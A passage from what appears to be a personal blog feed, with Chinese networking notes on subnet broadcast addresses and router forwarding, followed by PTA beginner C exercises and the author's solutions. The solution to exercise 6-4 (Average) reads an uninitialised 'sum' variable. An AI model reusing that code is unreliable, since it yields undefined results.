0000|192|<br>|1110 0000|224|<br>|1111 0000|240|<br>|1111 1000|248|<br>|1111 1100|252|<br>|1111 1110|254|<br>|1111 1111|255|</p><hr><h2 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h2><p><strong>某主机的 <code>IP地址</code>为 <code>180.80.77.55</code>，子网掩码为 <code>255.255.252.0</code>。若该主机向其所在的子网发送广播分组，则目的地址可以为</strong></p><p>A. 180.80.76.0<br>B. 180.80.76.255<br>C. 180.80.77.255<br>D. 180.80.79.255</p><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><p>首先值得注意是向子网发送 <font color="6495ED">广播分组</font><br><font color="6495ED">广播分组</font> 即为 <font color="6495ED">广播地址</font> 也就是主机号全 <code>1</code></p><p>因此可以首先排除A选项，然后可以关注到子网掩码的第三个位置是 <code>252</code><br>由上面的表可以知道二进制编码为 <code>1111 1100</code><br>也就是说前面共有 <code>8+8+6=22</code> 位为 <font color="6495ED">网络号+子网号</font> 后面的 <code>10位</code> 为主机号<br>然后看 <code>IP地址</code> <code>180.80.77.55</code><br>77 = <font color="6495ED">0100 11</font>01<br>可以判断主机所在的子网号为 <code>180.80.76.xxx</code><br>然后因为要找的是<font color="6495ED">目的地址</font>，所以所有的主机号都要为 1，所以第三位ip应该变成 <font color="6495ED">0100 1111</font> 即为 76+3=79，所以答案选 D</p><hr><h1 id="路由器转发分组的算法"><a href="#路由器转发分组的算法" class="headerlink" title="路由器转发分组的算法"></a>路由器转发分组的算法</h1><h2 id="提取目的IP地址"><a href="#提取目的IP地址" class="headerlink" title="提取目的IP地址"></a>提取目的IP地址</h2><p>从分组的首部提取目的IP地址 <code>D</code></p><h2 id="是否直接交付"><a href="#是否直接交付" class="headerlink" title="是否直接交付"></a>是否直接交付</h2><p>先用<font color="6495ED">与该路由器直接相连的网络</font>的子网掩码与IP地址 <code>D</code> 进行与运算，看结果是否与相应的网络，地址相匹配。若匹配，则进行直接交付。否则就是间接交付，马上执行下一步</p><h2 id="特定主机路由"><a href="#特定主机路由" class="headerlink" title="特定主机路由"></a>特定主机路由</h2><p>若路由表中有一条到目的主机 <code>D</code> 的特定路由，则将分组转发给其指明的下一跳路由器。否则执行下一步</p><h2 id="检测路由表中有无路径"><a href="#检测路由表中有无路径" class="headerlink" title="检测路由表中有无路径"></a>检测路由表中有无路径</h2><p>对路由表中每一行的子网掩码和D进行与运算，若结果与该行的目的网络地址匹配，则将分组传给该行指明的下一跳路由器。否则执行下一步</p><h2 id="默认路由-0-0-0-0"><a href="#默认路由-0-0-0-0" class="headerlink" title="默认路由 0.0.0.0"></a>默认路由 0.0.0.0</h2><p>若路由表中有一个默认路由，则将分组传给路由表中指明的默认路由器。<br>否则执行最后一步</p><h2 id="丢弃"><a href="#丢弃" class="headerlink" title="丢弃"></a>丢弃</h2><p>报告转发分组出错</p>]]></content>
    
    <summary type="html">
    
      写点计网的学习笔记
    
    </summary>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/categories/%E7%9E%8E%E6%89%AF/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
  <entry>
    <title>PTA a题</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/02/PTAbasic/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/02/PTAbasic/</id>
    <published>2020-03-02T10:12:34.420Z</published>
    <updated>2020-03-02T13:28:06.234Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>算法原理要花时间好好摸一下，推荐一个大佬的数据结构算法详解<br><a href="https://github.com/labuladong/fucking-algorithm" target="_blank" rel="noopener">手把手撕LeetCode题目，扒各种算法套路的裤子</a></p><a id="more"></a><h1 id="基础编程题目集"><a href="#基础编程题目集" class="headerlink" title="基础编程题目集"></a>基础编程题目集</h1><h2 id="6-1-简单输出整数-10分"><a href="#6-1-简单输出整数-10分" class="headerlink" title="6-1 简单输出整数 (10分)"></a>6-1 简单输出整数 (10分)</h2><p>本题要求实现一个函数，对给定的正整数 <code>N</code>，打印从1到N的全部正整数。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中N是用户传入的参数。该函数必须将从1到N的全部正整数顺序打印出来，每个数字占1行。</p><h3 id="裁判测试程序样例："><a href="#裁判测试程序样例：" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    PrintN( N );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">输入样例：</span><br><span class="line">3</span><br><span class="line">输出样例：</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure></div><h3 id="解答"><a href="#解答" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PrintN</span> <span class="params">( <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-2-多项式求值-15分"><a href="#6-2-多项式求值-15分" class="headerlink" title="6-2 多项式求值 (15分)"></a>6-2 多项式求值 (15分)</h2><p>本题要求实现一个函数，计算阶数为 <code>n</code>，系数为<code>a[0]</code> … <code>a[n]</code>的多项式<br>$$f(x)=\sum_{i=0}^n(a[i]×x^i<br>)$$在x点的值。</p><p>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中 <code>n</code> 是多项式的阶数，<code>a[]</code> 中存储系数，<code>x</code> 是给定点。函数须返回多项式 <code>f(x)</code> 的值。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入样例：</span><br><span class="line">2 1.1</span><br><span class="line">1 2.5 -38.7</span><br><span class="line">输出样例：</span><br><span class="line">-43.1</span><br></pre></td></tr></table></figure></div><h3 id="裁判测试程序样例：-1"><a href="#裁判测试程序样例：-1" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10 <span class="comment">// 定义最多10个a项</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, i;</span><br><span class="line">    <span class="keyword">double</span> a[MAXN], x;</span><br><span class="line">    <span class="comment">// double 就是比 float 精度更高的浮点数表示类型</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %lf"</span>, &amp;n, &amp;x);</span><br><span class="line">    <span class="comment">// %lf 双精度浮点型数据的输入格式控制符</span></span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;=n; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%lf"</span>, &amp;a[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.1f\n"</span>, f(n, a, x));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><h3 id="解答："><a href="#解答：" class="headerlink" title="解答："></a>解答：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">f</span><span class="params">( <span class="keyword">int</span> n, <span class="keyword">double</span> a[], <span class="keyword">double</span> x )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> sum = a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">double</span> res = <span class="number">1.0</span>;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>; i&lt;=n; ++i) &#123;</span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        int i = 3 ;</span></span><br><span class="line"><span class="comment">        a = i++; -&gt; a=3 -&gt; 先让a变成i的值，再让i加1</span></span><br><span class="line"><span class="comment">        b = ++i; -&gt; b=4 -&gt; 先让i加1, 再让b变成i的值</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        res *= x; <span class="comment">// res = x, x^2, x^3...  // res = res*x</span></span><br><span class="line">        sum += a[i] * res; <span class="comment">// sum = sum + a[i]*res</span></span><br><span class="line">        <span class="comment">/* </span></span><br><span class="line"><span class="comment">        printf("i=: %d", i);</span></span><br><span class="line"><span class="comment">        echo "i=1 / i=2"</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-3-简单求和-10分"><a href="#6-3-简单求和-10分" class="headerlink" title="6-3 简单求和 (10分)"></a>6-3 简单求和 (10分)</h2><p>本题要求实现一个函数，求给定的 <code>N</code> 个整数的和。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中给定整数存放在数组 <code>List[]</code> 中，正整数N是数组元素个数。该函数须返回N个 <code>List[]</code> 元素的和。</p><h3 id="裁判测试程序样例：-2"><a href="#裁判测试程序样例：-2" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> List[MAXN], N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;List[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, Sum(List, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12 34 -5</span><br><span class="line">输出</span><br><span class="line">41</span><br></pre></td></tr></table></figure></div><h3 id="解答-1"><a href="#解答-1" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Sum</span> <span class="params">( <span class="keyword">int</span> List[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> sum =<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ ) &#123;</span><br><span class="line">        sum += List[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-4-求自定类型元素的平均-10分"><a href="#6-4-求自定类型元素的平均-10分" class="headerlink" title="6-4 求自定类型元素的平均 (10分)"></a>6-4 求自定类型元素的平均 (10分)</h2><p>本题要求实现一个函数，求N个集合元素 <code>S[]</code> 的平均值，其中集合元素的类型为自定义的 <code>ElementType</code>。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中给定集合元素存放在 <code>数组S[]</code>中，正整数N是数组元素个数。该函数须返回N个 <code>S[]</code>元素的平均值，其值也必须是<code>ElementType类型</code>。</p><h3 id="裁判测试程序样例：-3"><a href="#裁判测试程序样例：-3" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Average(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">13.77</span><br></pre></td></tr></table></figure></div><h3 id="解答-2"><a href="#解答-2" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Average</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType sum, average;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        sum += S[i];</span><br><span class="line">    &#125;</span><br><span class="line">    average = sum/N;</span><br><span class="line">    <span class="keyword">return</span> average;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-5-求自定类型元素的最大值-10分"><a href="#6-5-求自定类型元素的最大值-10分" class="headerlink" title="6-5 求自定类型元素的最大值 (10分)"></a>6-5 求自定类型元素的最大值 (10分)</h2><p>本题要求实现一个函数，求N个集合元素 <code>S[]</code> 中的最大值，其中集合元素的类型为自定义的 <code>ElementType</code>。</p><p>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br></pre></td></tr></table></figure></div><p>其中给定集合元素存放在 <code>数组S[]</code> 中，正整数N是数组元素个数。该函数须返回N个<code>S[]元素中的最大值</code>，其值也必须是 <code>ElementType类型</code>。</p><h3 id="裁判测试程序样例：-4"><a href="#裁判测试程序样例：-4" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 10</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">float</span> ElementType;</span><br><span class="line"></span><br><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ElementType S[MAXN];</span><br><span class="line">    <span class="keyword">int</span> N, i;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;N);</span><br><span class="line">    <span class="keyword">for</span> ( i=<span class="number">0</span>; i&lt;N; i++ )</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%f"</span>, &amp;S[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%.2f\n"</span>, Max(S, N));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 你的代码将被嵌在这里 */</span></span><br></pre></td></tr></table></figure></div><p>然后是输入输出样式：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">输入</span><br><span class="line">3</span><br><span class="line">12.3 34 -5</span><br><span class="line">输出</span><br><span class="line">34.00</span><br></pre></td></tr></table></figure></div><h3 id="解答-3"><a href="#解答-3" class="headerlink" title="解答"></a>解答</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ElementType <span class="title">Max</span><span class="params">( ElementType S[], <span class="keyword">int</span> N )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    ElementType <span class="built_in">max</span> = S[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">max</span> &lt; S[i]) &#123;</span><br><span class="line">            <span class="built_in">max</span> = S[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">max</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h2 id="6-6-求单链表结点的阶乘和-15分"><a href="#6-6-求单链表结点的阶乘和-15分" class="headerlink" title="6-6 求单链表结点的阶乘和 (15分)"></a>6-6 求单链表结点的阶乘和 (15分)</h2><p>本题要求实现一个函数，求 <code>单链表L</code> 结点的阶乘和。这里默认所有结点的值非负，且题目保证结果在 <code>int</code> 范围内。<br>函数接口定义：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">FactorialSum</span><span class="params">( List L )</span></span>;</span><br></pre></td></tr></table></figure></div><h3 id="裁判测试程序样例：-5"><a href="#裁判测试程序样例：-5" class="headerlink" title="裁判测试程序样例："></a>裁判测试程序样例：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span 